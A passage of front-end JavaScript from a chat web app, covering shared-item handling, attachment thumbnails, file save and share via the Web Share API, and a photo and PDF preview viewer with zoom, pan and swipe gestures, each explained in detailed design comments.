// also makes this failure-tolerant — if the new chat never arrives, the file is
// still attached to the chat you are in, which is the old behaviour and not a
// loss.
const freshHonoured = new Set(); // ids already acted on — a hello repeats them

function openChatForFreshShares(items) {
  const fresh = items.filter((item) => item.fresh && !freshHonoured.has(item.id));
  if (!fresh.length) return;
  // ALL of them are marked, and at most ONE chat is opened: sharing three
  // photos then opening aish means one new chat holding three, not three chats
  // holding one each and two of them empty.
  for (const item of fresh) freshHonoured.add(item.id);
  // Nothing to leave behind: opening a new chat from an unused one just leaves
  // an empty row in the rail and looks like the button misfired.
  if (transcriptIsEmpty()) return;
  requestNewChat();
}

// The server owns the inbox, so removal is a request, not a local splice. The
// repaint arrives as the `shared` broadcast that follows — including on the
// OTHER device, whose copy of this chip must go too.
function dropShare(id, lost) {
  act({ type: "share_drop", id }, { label: "clearing that shared item", lost });
}

// A message that has gone consumes the shared items it carried. Plain `send`,
// not `act`: if this is the request that goes missing, the item stays in the
// inbox and is offered again — which is precisely what "we don't know whether
// it was used" should look like. The opposite failure, quietly spending a
// share that never went anywhere, is the one with nothing on screen to notice.
function releaseSentShares(sent) {
  for (const attachment of sent) {
    if (attachment.share) send({ type: "share_drop", id: attachment.share });
  }
}
// [SHARES-END]

// Which attachments can be shown as a picture. Deliberately the same set the
// server will deliver natively (backends.IMAGE_SUFFIXES) — /file answers 415
// for anything else, and a chip that asked for one would flash a broken image.
const ATTACH_IMAGE_RE = /\.(png|jpe?g|gif|webp)$/i;

function renderAttachments() {
  const box = $("attachments");
  box.replaceChildren();
  box.hidden = !attachments.length;
  attachments.forEach((attachment, i) => {
    const chip = document.createElement("span");
    chip.className = "attach-chip";
    // A thumbnail, not just a filename — and it does two jobs. You can see
    // WHICH photo is about to go (a name like IMG_4021.jpg identifies nothing),
    // and the bytes are fetched NOW, while you are still typing, through the
    // same /file URL the sent bubble will use. That second job is why the photo
    // appears the instant you press send: on a phone over a tunnel a
    // multi-megabyte original took seconds to arrive when the bubble asked for
    // it for the first time, and there is no reason for that wait to land on
    // the one moment you are watching for a result.
    const src = ATTACH_IMAGE_RE.test(attachment.path || "") ? imageSrc(attachment.path) : null;
    if (src) {
      const thumb = document.createElement("img");
      thumb.className = "attach-thumb";
      thumb.src = src;
      thumb.alt = "";
      // A file that will not render must not leave a broken-image glyph in the
      // composer: drop back to the name, which is still true.
      thumb.onerror = () => thumb.remove();
      chip.appendChild(thumb);
    }
    const label = document.createElement("span");
    label.className = "attach-name";
    label.textContent = shortName(attachment.name);
    chip.appendChild(label);
    chip.title = attachment.name; // the full name is always one hover away
    if (src) {
      chip.classList.add("attach-openable");
      chip.onclick = (event) => {
        if (event.target.closest("button")) return; // ✕ is not "open it"
        const group = attachments
          .filter((a) => ATTACH_IMAGE_RE.test(a.path || ""))
          .map((a) => ({ src: imageSrc(a.path), name: a.name, file: a.path }));
        openPreview(src, attachment.name, group, group.findIndex((g) => g.src === src));
      };
    } else if (isPdfPath(attachment.path)) {
      // The document you are about to send, before you send it — the same tap
      // as a photo's, onto the same viewer. Deliberately WITHOUT a page-one
      // thumbnail: that would rasterise a page for every PDF the composer is
      // holding, and unlike IMG_4021.jpg a document's name usually says which
      // one it is.
      chip.classList.add("attach-openable");
      chip.onclick = (event) => {
        if (event.target.closest("button")) return; // ✕ is not "open it"
        openPdfPreview(attachment.path, attachment.name);
      };
    }
    const remove = document.createElement("button");
    remove.type = "button";
    remove.textContent = "✕";
    remove.onclick = () => {
      const [gone] = attachments.splice(i, 1);
      // Taking a SHARED item out is a dismissal, and the server has to hear it:
      // otherwise the next repaint of the inbox puts it straight back, and the
      // ✕ reads as broken.
      if (gone && gone.share) dropShare(gone.share);
      renderAttachments();
    };
    chip.appendChild(remove);
    box.appendChild(chip);
  });
}

// [ATTACH-SAVE-START]
// Looking at an attachment is not having it. A photo could be pinched and a PDF
// paged through, and there was still no way to get either OFF the chat and into
// Files, Photos or a folder — the one thing you want after reading a document
// somebody sent you.
//
// It saves the FILE, never what is on screen: for a PDF that is the document,
// not the page being read (a long-press on a page would save the page's PNG,
// which is the wrong object and silently so). The bytes are fetched and handed
// to `saveBlob` — the same one function the PDF export already saves through,
// because "put a file on this device" is one behaviour and two of them would
// diverge on the phone first.
function downloadSrc(path) {
  const params = new URLSearchParams({ path });
  if (token) params.set("token", token);
  return `/download?${params}`;
}

async function saveAttachment(path, name) {
  const label = name || String(path).split("/").pop();
  try {
    const response = await fetch(downloadSrc(path));
    if (!response.ok) {
      const body = await response.json().catch(() => ({}));
      showToast(`couldn't save ${label}: ${body.error || response.status}`);
      return false;
    }
    // Named from what the CLIENT knows, not from the response header: the
    // server's ASCII fallback is a transliteration, and the chat already holds
    // the real name — "Zażółć.pdf" must not save as "Za______.pdf".
    saveBlob(await response.blob(), label);
    return true;
  } catch {
    showToast(`couldn't save ${label} — is the server reachable?`);
    return false;
  }
}
// [ATTACH-SAVE-END]

// [ATTACH-SHARE-START]
// Save puts the file in Files. Share hands it to whoever it is FOR — Messages,
// Mail, Photos, AirDrop, another app — which on a phone is what "get this off
// the chat" nearly always means, and doing it through Files is a detour via a
// second app that then has to find the file again. iOS's own sheet does all of
// it in one tap, and the Web Share API can hand that sheet a real File.
//
// Whether the button is drawn at all is PROBED, never assumed: `navigator.share`
// on its own is text-and-URL sharing (every desktop browser has it), and a
// share button that opens a sheet with no file in it is worse than no share
// button. The probe is a dummy File through `canShare`, answered once — the
// answer cannot change within a page.
//
// What is shared is the FILE, never what is on screen — the same object Save
// saves, for the same reason: a PDF shares as the document, not as the PNG of
// page 7.
let shareFilesSupported = null;

function canShareFiles() {
  if (shareFilesSupported === null) {
    try {
      const probe = new File(["aish"], "probe.txt", { type: "text/plain" });
      shareFilesSupported = !!(
        navigator.share && navigator.canShare && navigator.canShare({ files: [probe] })
      );
    } catch {
      shareFilesSupported = false;
    }
  }
  return shareFilesSupported;
}

// The bytes of the file the share sheet is being opened on, kept because the
// sheet may be asked for twice — see the NotAllowedError case below.
let sharePrimed = { path: "", file: null, pending: null };

// Fetch once, keep the File. A rejection is NOT kept: a failed fetch is a
// server that was unreachable a second ago, and a cached rejection would make
// every later tap fail without asking again.
function attachmentFile(path, name) {
  if (sharePrimed.path === path && (sharePrimed.file || sharePrimed.pending)) {
    return sharePrimed.file ? Promise.resolve(sharePrimed.file) : sharePrimed.pending;
  }
  const cell = { path, file: null, pending: null };
  sharePrimed = cell;
  cell.pending = (async () => {
    const response = await fetch(downloadSrc(path));
    if (!response.ok) {
      const body = await response.json().catch(() => ({}));
      throw new Error(String(body.error || response.status));
    }
    const blob = await response.blob();
    // Named and typed for the RECEIVING app: the name is the chat's (the
    // header's is an ASCII transliteration, as [ATTACH-SAVE] explains), and
    // the type decides which apps the sheet even offers.
    const file = new File([blob], name, { type: blob.type || "application/octet-stream" });
    if (sharePrimed === cell) cell.file = file;
    return file;
  })();
  cell.pending.catch(() => {
    if (sharePrimed === cell) sharePrimed = { path: "", file: null, pending: null };
  });
  return cell.pending;
}

// Start the download while the finger is still DOWN. iOS only allows a share
// sheet to open for a tap that is still current, and a multi-megabyte PDF
// arriving over the tunnel outlives that window — so the press begins the
// fetch and the release usually has an already-resolved File to hand over.
// Fire-and-forget on purpose: a failure here is reported by the tap that
// follows, which is the one the owner is watching.
function primeShare(path, name) {
  if (path) attachmentFile(path, name || String(path).split("/").pop()).catch(() => {});
}

async function shareAttachment(path, name) {
  const label = name || String(path).split("/").pop();
  const ready = sharePrimed.path === path && !!sharePrimed.file;
  let file;
  try {
    file = await attachmentFile(path, label);
  } catch (err) {
    showToast(`couldn't share ${label}: ${(err && err.message) || "unreachable"}`);
    return false;
  }
  // Asked again for THIS file: a browser can share files in general and refuse
  // a particular type, and finding that out from an empty sheet is no answer.
  if (!navigator.canShare || !navigator.canShare({ files: [file] })) {
    showToast(`${label} can't be shared — Save puts it in Files`);
    return false;
  }
  try {
    await navigator.share({ files: [file], title: label });
    return true;
  } catch (err) {
    // Dismissing the sheet is a decision, not a failure — it says nothing.
    if (err && err.name === "AbortError") return false;
    // The one tap that had to wait for the bytes can outlive the gesture iOS
    // will open a sheet for. The file is HERE now, so the honest ask is to tap
    // again — the second tap opens the sheet with nothing to wait for.
    const stale = !ready && err && err.name === "NotAllowedError";
    showToast(stale ? `${label} is ready — tap share again` : `couldn't share ${label}`);
    return false;
  }
}
// [ATTACH-SHARE-END]

// [PREVIEW-START]
// Tap a picture, see the picture. It opens from three places — a composer
// attachment chip, an attachment on a sent message, and an inline image the
// model produced — and all three used to do something else or nothing: the
// composer chip was inert, and a thumbnail opened a NEW TAB, which from an
// installed PWA means leaving the app for Safari to look at your own photo.
//
// Deliberately NOT a dismiss-on-tap-the-image overlay: long-press on the image
// is how iOS offers Save Image, and a tap handler there makes that fiddly. The
// backdrop, the ✕ and Escape all close it.
// `group` is the pictures this one belongs to — the images in the same message,
// or the ones waiting in the composer — so a swipe can move between them.
// Opening a lone picture passes nothing and the paging simply never engages.
//
// A PDF opens here too, because its PAGES are the pictures: the group is the
// document's pages, rasterised one at a time by the server, and every gesture
// the viewer already has means the obvious thing on a page — swipe to turn it,
// pinch to read the small print, the counter is the page number. See
// openPdfPreview for why it is not an <iframe>.
let previewGroup = [];
let previewIndex = 0;
// The src currently ON the image, tracked rather than read back: the DOM
// returns an absolutised URL, so comparing against it would never match and
// every repaint would re-set the src — which restarts the load of a page that
// is already on screen.
let previewSrc = "";
// The document the open preview belongs to, "" for photographs. Its page count
// arrives AFTER the preview opens (L7 — a tap opens the picture, it does not
// wait for a round trip), by which time the owner may have closed it or opened
// something else, so a late answer is applied only if it still names what is
// on screen.
let previewDoc = "";
let previewPending = null;

// A page that renders quickly should show no spinner at all: the flash of one
// is more noticeable than the wait it announces.
const PREVIEW_STATUS_MS = 200;

function isPdfPath(path) {
  return /\.pdf$/i.test(String(path == null ? "" : path));
}

function pdfPageSrc(path, page) {
  const params = new URLSearchParams({ path, page: String(page) });
  if (token) params.set("token", token);
  return `/pdf/page?${params}`;
}

// `doc` is the PDF these pictures are pages of, and it is set BEFORE anything
// is shown rather than by the caller afterwards: the first page is the one with
// the longest wait (nothing of that document is rendered yet), so a preview
// that only learns it is a document after painting has already missed the
// moment it needed to say "rendering…".
function openPreview(src, name, group, index, doc) {
  const box = $("preview");
  if (!box) return;
  previewDoc = doc ? String(doc) : "";
  previewGroup = Array.isArray(group) && group.length ? group : [{ src, name }];
  previewIndex = Math.max(0, Math.min(previewGroup.length - 1, index || 0));
  previewShow(previewIndex);
  box.hidden = false;
  // Every picture opens at fit. Inheriting the last one's zoom would show a
  // new photo already halfway into a corner ([PREVIEW-GESTURE]).
  previewReset();
}

// A PDF, previewed as the pages it is made of.
//
// Rejected: an <iframe> pointed at the file. It gives a real PDF viewer on a
// desktop and fails on the device this feature is for — iOS Safari renders
// only the FIRST page of an embedded PDF, and inside a standalone PWA there is
// no browser chrome to escape to. Rejected too: a PDF renderer on the client,
// which is a megabyte of library for something the server already does (aish
// depends on PyMuPDF, and `read_pdf` rasterises a page it cannot read as text
// for exactly the same reason — an unreadable page IS a picture).
//
// Page 1 goes up on the tap, before anything is known about the document. The
// count only decides how far a swipe may go, so waiting for it would make
// opening an attachment the one action in the app that costs a round trip.
function openPdfPreview(path, name) {
  const label = name || String(path).split("/").pop();
  const first = pdfPageSrc(path, 1);
  openPreview(first, label, [{ src: first, name: label, file: path }], 0, path);
  if (!previewIsOpen()) return;
  const params = new URLSearchParams({ path });
  if (token) params.set("token", token);
  fetch(`/pdf/info?${params}`)
    .then((response) => (response.ok ? response.json() : null))
    .then((info) => info && previewAdoptPages(path, label, info.pages))
    // A count that never arrives leaves a one-page document: page 1 is on
    // screen and readable, which is strictly better than an error over a
    // picture the owner can already see.
    .catch(() => {});
}

// The pages, once the server has said how many there are. Guarded on the
// document still being the one open: this lands from a fetch, and the tap that
// closed the preview or opened another file has no way to cancel it.
function previewAdoptPages(path, name, pages) {
  const total = Math.max(1, Math.floor(Number(pages) || 1));
  if (!previewIsOpen() || previewDoc !== String(path) || total < 2) return false;
  previewGroup = Array.from({ length: total }, (_, i) => ({
    src: pdfPageSrc(path, i + 1),
    name,
    file: path, // every page saves the DOCUMENT, not itself
  }));
  previewShow(Math.min(previewIndex, total - 1)); // the counter, under the page already up
  return true;
}

// Put picture `i` on screen. The ONE writer of what the preview is showing —
// the src, the name, the counter, the index and what the status line says all
// move together, and a half-applied step (new picture, old name) is the kind
// of thing nobody notices until they are trying to tell two photos apart.
function previewShow(i) {
  const item = previewGroup[i];
  if (!item) return;
  previewIndex = i;
  if (item.src !== previewSrc) {
    previewSrc = item.src;
    $("preview-img").classList.remove("broken"); // the last one's failure is not this one's
    $("preview-img").src = item.src;
    previewAwaitPage();
  }
  $("preview-img").alt = item.name || "";
  $("preview-name").textContent = item.name || "";
  // Which FILE is behind this picture, and therefore what Save would save. It
  // moves with the picture like everything else here: a save button naming the
  // document you have swiped away from is the same class of half-applied step
  // as a new picture under an old name.
  const save = $("preview-save");
  if (save) {
    save.hidden = !item.file;
    save.title = item.file ? `Save ${item.name || "this file"}` : "";
  }
  // Share rides along with Save — same file, same moment — but is drawn only
  // where the browser can actually hand a FILE to a share sheet ([ATTACH-SHARE]).
  const share = $("preview-share");
  if (share) {
    share.hidden = !item.file || !canShareFiles();
    share.title = item.file ? `Share ${item.name || "this file"}` : "";
  }
  const counter = $("preview-count");
  if (counter) {
    // Only when there IS a set: "1 / 1" on a single photo is noise that also
    // implies a swipe would do something.
    counter.textContent = previewGroup.length > 1 ? `${i + 1} / ${previewGroup.length}` : "";
    counter.hidden = previewGroup.length < 2;
  }
  previewPrefetch();
}

// What the picture cannot say for itself while it is not there yet. A photo is
// already on the device and needs none of this; a PDF page is RENDERED when it
// is asked for, and a black screen during that reads as a preview that opened
// onto nothing.
function previewStatus(text) {
  const el = $("preview-status");
  if (!el) return;
  el.textContent = text || "";
  el.hidden = !text;
}

function previewAwaitPage() {
  if (previewPending) clearTimeout(previewPending);
  previewStatus("");
  if (!previewDoc) return; // a photo arrives from the device, not from a renderer
  const page = previewIndex + 1;
  previewPending = setTimeout(() => {
    previewPending = null;
    previewStatus(`Rendering page ${page}…`);
  }, PREVIEW_STATUS_MS);
}

function previewPageLoaded() {
  if (previewPending) clearTimeout(previewPending);
  previewPending = null;
  previewStatus("");
  $("preview-img").classList.remove("broken");
}

// The one case where the overlay must speak: the bytes never came. For a page
// that is a rendering that failed (encrypted, corrupt, a page that is not
// there); for a photo it is a file that has gone since it was sent. Either way
// the alternative is a broken-image glyph on black.
function previewPageFailed() {
  if (previewPending) clearTimeout(previewPending);
  previewPending = null;
  previewStatus(
    previewDoc ? `Page ${previewIndex + 1} couldn't be rendered` : "This picture couldn't be loaded"
  );
  // And the failed <img> goes with it. A broken image is not blank: the browser
  // draws its own glyph WITH the alt text — in the corner, over the bar, so the
  // file name appeared twice and the message below read as a third thing on a
  // screen that has nothing on it. Hidden, not emptied, so the gesture layer
  // still measures the same box.
  $("preview-img").classList.add("broken");
}

// The next page and the one before it, fetched while the current one is being
// read. Only for a document: a photo's bytes are already on the device (the
// bubble or the composer chip fetched them), whereas every page is a render
// the server has not been asked for yet, and a swipe that waits for one is a
// swipe that feels broken.
function previewPrefetch() {
  if (!previewDoc || typeof Image !== "function") return;
  for (const step of [1, -1]) {
    const item = previewGroup[previewIndex + step];
    if (item) new Image().src = item.src;
  }
}

function previewGroupState() {
  return { count: previewGroup.length, index: previewIndex };
}

// What Save would save right now, or null when there is nothing behind the
// picture. Read at the moment of the tap rather than captured when the button
// was drawn — a swipe moves the file under it.
function previewSaveTarget() {
  const item = previewGroup[previewIndex];
  return item && item.file ? { file: item.file, name: item.name } : null;
}

// Step to the next/previous picture: the current one slides out the way it was
// pushed, the new one comes in from the other side. Done on the single <img>
// rather than two elements — a viewer that keeps both loaded is a memory
// problem on a phone for a nicety nobody asked for.
function previewStep(direction) {
  const box = previewBox();
  const next = previewIndex + direction;
  if (!box || !previewGroup[next]) return false;
  previewState = { scale: 1, x: -direction * box.view.w, y: 0 };
  previewPaint(true, 0, true);
  setTimeout(() => {
    previewShow(next);
    previewState = { scale: 1, x: direction * box.view.w, y: 0 };
    previewPaint(false, 0, true);      // placed off-screen with no animation…
    requestAnimationFrame(() => {
      previewState = { scale: 1, x: 0, y: 0 };
      previewPaint(true);              // …then animated home
    });
  }, PREVIEW_SLIDE_MS);
  return true;
}

const PREVIEW_SLIDE_MS = 200;

function closePreview() {
  const box = $("preview");
  if (!box || box.hidden) return false;
  previewSnapshot(); // before the reset below wipes what /debug would report
  box.hidden = true;
  // Drop the bytes' claim on memory, and make sure a stale picture can never
  // flash when the next one is opened.
  $("preview-img").removeAttribute("src");
  previewSrc = "";
  // The document goes with it, so a page count still in flight cannot land on
  // a preview that has been closed — and so the next photo is not treated as
  // a page that needs rendering.
  previewDoc = "";
  previewPageLoaded(); // clears the pending status timer and the status line
  previewReset();
  return true;
}

function previewIsOpen() {
  const box = $("preview");
  return !!box && !box.hidden;
}
// [PREVIEW-END]

// [PREVIEW-GESTURE-START]
// The gestures every photo viewer has, and which one without them is judged
// against: double-tap to zoom (and again to fit), drag to pan while zoomed,
// pinch to zoom by hand, and — at fit — a drag DOWN that carries the picture
// with your finger and lets go of it.
//
// The transform is modelled as pure functions over {scale, x, y} so the maths
// can be checked without a browser: the interesting failures here are not
// "does it move" but "does it move to the RIGHT place" — a zoom that does not
// keep the tapped detail under the finger, or a pan that lets the picture
// wander off into the black.
//
// Coordinates are relative to the IMG's own box (not the viewport), and the
// origin is its centre, which is where a CSS transform scales from.
const PREVIEW_ZOOM = 2.5;      // what a double-tap goes to; Photos-ish
const PREVIEW_MAX_ZOOM = 6;
const PREVIEW_DISMISS_PX = 100; // drag further than this at fit and it closes
const PREVIEW_TAP_MS = 300;     // two taps inside this are a double-tap
const PREVIEW_TAP_SLOP = 24;    // …and within this distance of each other

// The picture as actually drawn at scale 1. `object-fit: contain` letterboxes
// it, and panning must be bounded by the PICTURE rather than by the element —
// bounding by the element lets you drag the image off into the empty margin,
// which feels broken in a way that is hard to name.
function previewContent(view, natural) {
  if (!natural.w || !natural.h || !view.w || !view.h) return { w: view.w, h: view.h };
  const ratio = natural.w / natural.h;
  const w = Math.min(view.w, view.h * ratio);
  return { w, h: w / ratio };
}

// Keep the picture covering the screen: no offset that would show black where
// the picture could be. Below fit scale there is nothing to pan, so it centres.
function previewClamp(state, view, natural) {
  const content = previewContent(view, natural);
  const maxX = Math.max(0, (content.w * state.scale - view.w) / 2);
  const maxY = Math.max(0, (content.h * state.scale - view.h) / 2);
  return {
    scale: state.scale,
    x: Math.min(maxX, Math.max(-maxX, state.x)),
    y: Math.min(maxY, Math.max(-maxY, state.y)),
  };
}

// Scale about `point`, leaving whatever is under it exactly where it is. This
// is the difference between "zoom" and "zoom to the middle and hunt for the bit
// you wanted": double-tapping a face should enlarge THAT face.
function previewZoomAt(state, scale, point, view, natural) {
  scale = Math.min(PREVIEW_MAX_ZOOM, Math.max(1, scale));
  const k = scale / state.scale;
  return previewClamp({
    scale,
    x: (point.x - view.w / 2) * (1 - k) + state.x * k,
    y: (point.y - view.h / 2) * (1 - k) + state.y * k,
  }, view, natural);
}

// A double-tap toggles: zoomed in anywhere goes back to fit, which is what
// every viewer does and saves a pinch-out to escape.
function previewToggleZoom(state, point, view, natural) {
  const target = state.scale > 1.01 ? 1 : PREVIEW_ZOOM;
  return previewZoomAt(state, target, point, view, natural);
}

// A drag at fit scale is a dismissal in progress: the picture follows the
// finger and the background fades, so it is obvious what letting go will do.
// Once ZOOMED the same drag is a pan instead — a picture you are examining
// must not fall out of the window because you looked at its bottom edge.
function previewDrag(state, delta, view, natural) {
  if (state.scale > 1.01) {
    return {
      ...previewClamp({ scale: state.scale, x: state.x + delta.x, y: state.y + delta.y },
        view, natural),
      dismissing: 0,
    };
  }
  // Only downward carries the picture: sideways at fit does nothing (there is
  // no next photo to page to), and upward is left alone.
  const down = Math.max(0, delta.y);
  return { scale: 1, x: 0, y: down, dismissing: down / PREVIEW_DISMISS_PX };
}

// Paging between the pictures in one message. Horizontal only at FIT — zoomed,
// a sideways drag is a pan, and stealing it to change picture would make a
// close look impossible to examine.
//
// No wrap: the ends resist instead. Wrapping saves a swipe and costs you the
// knowledge of where you are in a set of three, which is the wrong trade for a
// handful of photos.
const PREVIEW_SWIPE_PX = 70;   // past this on release, the picture changes
const PREVIEW_END_DRAG = 0.35; // how much the ends give, so they feel like ends

function previewSwipe(delta, group) {
  const atEnd =
    (delta.x > 0 && group.index === 0) ||
    (delta.x < 0 && group.index >= group.count - 1);
  return { scale: 1, x: atEnd ? delta.x * PREVIEW_END_DRAG : delta.x, y: 0, swiping: true };
}

// Which way to step on release: -1 back, +1 on, 0 stay. A short drag stays,
// and so does one against an end — the rubber-band already said so.
function previewSwipeStep(x, group) {
  if (Math.abs(x) < PREVIEW_SWIPE_PX) return 0;
  if (x < 0 && group.index < group.count - 1) return 1;
  if (x > 0 && group.index > 0) return -1;
  return 0;
}

// Which axis a drag is committed to. Decided once, from the first movement
// worth calling a direction, and then kept: a swipe that re-decides mid-drag
// wobbles between paging and dismissing and does neither cleanly.
function previewAxis(delta) {
  if (Math.hypot(delta.x, delta.y) < 8) return null;
  return Math.abs(delta.x) > Math.abs(delta.y) ? "x" : "y";
}

function previewDragEnds(state) {
  return state.scale <= 1.01 && state.y >= PREVIEW_DISMISS_PX;
}

// Two fingers do TWO things at once, and both have to be honoured: they scale
// by how far apart they have moved, and they carry the picture by how far the
// pair as a whole has travelled. `from` is the midpoint where the pinch began,
// `to` is where it is now.
//
// The bit of picture under the fingers when they landed stays under them: find
// its content coordinate against the state at the START of the pinch, then put
// that coordinate under the CURRENT midpoint. A pure two-finger drag (ratio 1)
// therefore moves the picture exactly with the fingers.
//
// Anchoring on `to` alone — as this did — gives a REVERSED two-finger pan. The
// correction (to - centre)(1 - scale ratio) is negative once you are zooming
// in, so the picture slides the opposite way to the hands moving it, which is
// unmistakable to use and entirely invisible in a symmetric pinch test where
// the midpoint never moves.
function previewPinch(startState, ratio, from, to, view, natural) {
  const scale = Math.min(PREVIEW_MAX_ZOOM, Math.max(1, startState.scale * ratio));
  // The content coordinate under the fingers when they landed (unscaled,
  // relative to the centre, which is what the transform scales about).
  const anchor = {
    x: (from.x - view.w / 2 - startState.x) / startState.scale,
    y: (from.y - view.h / 2 - startState.y) / startState.scale,
  };
  return previewClamp({
    scale,
    x: to.x - view.w / 2 - scale * anchor.x,
    y: to.y - view.h / 2 - scale * anchor.y,
  }, view, natural);
}
// [PREVIEW-GESTURE-END]

// The DOM half of the preview gestures. Everything above is arithmetic; this
// is the part that has to know about fingers. Pointer events rather than touch
// events so a mouse gets the same behaviour for free (double-CLICK to zoom,
// drag to pan, wheel to scale) — and so two fingers are just two pointer ids
// instead of a second event family.
let previewState = { scale: 1, x: 0, y: 0 };
const previewPointers = new Map();
let previewDragFrom = null;   // {x, y, state, moved} while one finger is down
let previewPinchFrom = null;  // {dist, state} while two are
let previewLastTap = 0;
let previewLastTapAt = { x: 0, y: 0 };

// The element's LAYOUT box, in viewport coordinates — deliberately NOT
// getBoundingClientRect(), which reports the box AFTER the transform. Reading
// it there is the bug that let the picture escape: every clamp was measured
// against a "screen" that grew with the zoom, so at 6x the bounds were six
// times too generous and the photo could be flung right off, leaving a screen
// of black. It cannot be caught by the transform tests — they are handed a
// correct view — and it looks perfectly reasonable in the source.
//
// #preview is `position: fixed` and untransformed, so it is both a trustworthy
// origin and the image's offsetParent.
function previewBox() {
  const el = $("preview-img");
  const outerEl = $("preview");
  if (!el || !outerEl || !outerEl.getBoundingClientRect) return null;
  const outer = outerEl.getBoundingClientRect();
  const width = el.offsetWidth || outer.width;
  const height = el.offsetHeight || outer.height;
  return {
    view: { w: width, h: height },
    natural: { w: el.naturalWidth || 0, h: el.naturalHeight || 0 },
    rect: {
      left: outer.left + (el.offsetLeft || 0),
      top: outer.top + (el.offsetTop || 0),
      width,
      height,
    },
  };
}

function previewReset() {
  previewState = { scale: 1, x: 0, y: 0 };
  previewPointers.clear();
  previewDragFrom = previewPinchFrom = null;
  previewPaint(false);
}

// The one writer of what the preview looks like. `settle` animates — used when
// letting go, never while a finger is down, where the picture must track it
// exactly or the whole thing feels like it is lagging.
function previewPaint(settle, dismissing = 0, free = false) {
  const el = $("preview-img");
  const box = $("preview");
  if (!el || !box) return;
  // THE enforcement point. Every gesture path already clamps its own result,
  // and that was not enough: it makes "the picture stays on screen" a property
  // of five call sites agreeing, so one new path — or one that runs before the
  // image has loaded and knows its shape — puts the photo somewhere it cannot
  // be recovered from. Clamping HERE makes an out-of-bounds transform
  // unwritable rather than merely unwritten.
  //
  // The dismissal drag is the one deliberate exception: it is *supposed* to
  // carry the picture off the bottom of the screen.
  if (!dismissing && !free) {
    const measured = previewBox();
    if (measured) previewState = previewClamp(previewState, measured.view, measured.natural);
  }
  if (el.classList) el.classList.toggle("settling", !!settle);
  if (el.style) {
    el.style.transform =
      `translate(${previewState.x}px, ${previewState.y}px) scale(${previewState.scale})`;
    // Fading the surround as it is dragged away is what says "let go and this
    // closes" without a word of instruction.
    el.style.opacity = String(Math.max(0.3, 1 - dismissing * 0.6));
  }
  if (box.style) box.style.background = `rgba(0, 0, 0, ${Math.max(0.35, 1 - dismissing * 0.7)})`;
}

function previewPoint(event, rect) {
  return { x: event.clientX - rect.left, y: event.clientY - rect.top };
}

function previewDown(event) {
  if (event.target.closest && event.target.closest("#preview-bar")) return; // the ✕
  const box = previewBox();
  if (!box) return;
  previewPointers.set(event.pointerId, { x: event.clientX, y: event.clientY });
  // Deliberately NO setPointerCapture. Capturing on the <img> looked like the
  // careful thing to do and silently broke every drag: the capture was lost a
  // frame later (a transformed capture target), the lostpointercapture came
  // with a pointercancel, and that ended the gesture — so exactly ONE move was
  // ever applied and a 220px drag registered as 18px. The overlay is
  // full-screen and the listeners are on it, so the pointer has nowhere to
  // escape to and capture buys nothing.
  if (previewPointers.size === 2) {
    const [a, b] = [...previewPointers.values()];
    previewPinchFrom = {
      dist: Math.hypot(a.x - b.x, a.y - b.y) || 1,
      state: previewState,
      // Where the pair began, so the picture can follow them as they travel.
      mid: {
        x: (a.x + b.x) / 2 - box.rect.left,
        y: (a.y + b.y) / 2 - box.rect.top,
      },
    };
    previewDragFrom = null;
    return;
  }
  previewDragFrom = { x: event.clientX, y: event.clientY, state: previewState, moved: false };
}

function previewMove(event) {
  const box = previewBox();
  if (!box || !previewPointers.has(event.pointerId)) return;
  previewPointers.set(event.pointerId, { x: event.clientX, y: event.clientY });
  event.preventDefault();

  if (previewPointers.size >= 2 && previewPinchFrom) {
    const [a, b] = [...previewPointers.values()];
    const dist = Math.hypot(a.x - b.x, a.y - b.y) || 1;
    const mid = { x: (a.x + b.x) / 2 - box.rect.left, y: (a.y + b.y) / 2 - box.rect.top };
    previewState = previewPinch(
      previewPinchFrom.state, dist / previewPinchFrom.dist,
      previewPinchFrom.mid, mid, box.view, box.natural,
    );
    previewPaint(false);
    return;
  }
  if (!previewDragFrom) return;
  const delta = { x: event.clientX - previewDragFrom.x, y: event.clientY - previewDragFrom.y };
  if (Math.hypot(delta.x, delta.y) > 6) previewDragFrom.moved = true;
  // At FIT with a set to move through, a sideways drag pages instead of
  // dismissing. The axis is committed once ([PREVIEW-GESTURE]).
  previewDragFrom.axis = previewDragFrom.axis || previewAxis(delta);
  const paging =
    previewDragFrom.state.scale <= 1.01 &&
    previewGroup.length > 1 &&
    previewDragFrom.axis === "x";
  if (paging) {
    const swipe = previewSwipe(delta, previewGroupState());
    previewState = { scale: 1, x: swipe.x, y: 0 };
    previewDragFrom.paging = true;
    previewPaint(false, 0, true);
    return;
  }
  const next = previewDrag(
    { ...previewDragFrom.state, x: previewDragFrom.state.x, y: previewDragFrom.state.y },
    delta, box.view, box.natural,
  );
  previewState = { scale: next.scale, x: next.x, y: next.y };
  previewPaint(false, next.dismissing || 0);
}

function previewUp(event) {
  const box = previewBox();
  previewPointers.delete(event.pointerId);
  if (previewPointers.size < 2) previewPinchFrom = null;
  if (!box || !previewDragFrom) return;
  const drag = previewDragFrom;
  previewDragFrom = null;
  if (previewPointers.size) return; // still pinching with the other finger

  if (drag.moved) {
    previewSnapshot();
    if (drag.paging) {
      const step = previewSwipeStep(previewState.x, previewGroupState());
      // Not far enough, or against an end: the picture goes back, which is the
      // answer to "was that a swipe?" — visibly, it was not.
      if (!step || !previewStep(step)) {
        previewState = { scale: 1, x: 0, y: 0 };
        previewPaint(true);
      }
      return;
    }
    if (previewDragEnds(previewState)) { closePreview(); return; }
    // Not far enough: the picture goes back where it was, which is the answer
    // to "did that do anything?" — it visibly did not.
    previewState = previewClamp(previewState, box.view, box.natural);
    if (previewState.scale <= 1.01) previewState = { scale: 1, x: 0, y: 0 };
    previewPaint(true);
    return;
  }

  // A tap. Two in quick succession, close together, toggle the zoom.
  const now = Date.now();
  const near = Math.hypot(event.clientX - previewLastTapAt.x, event.clientY - previewLastTapAt.y);
  if (now - previewLastTap < PREVIEW_TAP_MS && near < PREVIEW_TAP_SLOP) {
    previewLastTap = 0;
    previewState = previewToggleZoom(
      previewState, previewPoint(event, box.rect), box.view, box.natural,
    );
    previewPaint(true);
    return;
  }
  previewLastTap = now;
  previewLastTapAt = { x: event.clientX, y: event.clientY };
  // A single tap on the SURROUND closes; on the picture it does nothing, so
  // long-press there still offers Save Image ([PREVIEW]). A tap on a BUTTON in
  // the bar is neither: the button's own onclick has run, and closing on top of
  // it would tear the viewer down the moment you asked it to save something.
  if (
    event.target &&
    event.target.id !== "preview-img" &&
    !(event.target.closest && event.target.closest("button")) &&
    previewState.scale <= 1.01
  ) {
